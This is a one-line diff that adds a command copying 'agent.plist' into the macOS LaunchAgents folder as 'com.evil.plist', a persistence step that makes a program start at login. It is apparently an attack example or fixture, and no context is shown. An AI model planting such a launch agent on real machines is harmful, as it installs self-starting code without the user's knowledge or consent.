@@ -1,0 +1,1 @@
+cp agent.plist ~/Library/LaunchAgents/com.evil.plist
